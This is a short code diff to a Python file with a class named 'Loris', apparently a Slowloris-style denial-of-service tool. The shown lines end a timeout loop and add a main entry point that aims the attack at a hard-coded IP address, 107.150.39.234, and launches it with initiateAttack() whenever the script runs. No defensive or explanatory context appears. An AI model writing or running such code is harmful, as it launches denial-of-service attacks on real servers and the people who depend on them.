@@ -132,3 +132,10 @@ class Loris:
             
             """ Sleep for timeout """
             time.sleep(self.timeout)
+
+def main():
+    l = Loris("107.150.39.234")
+    l.initiateAttack()
+
+if __name__ == "__main__":
+    main()
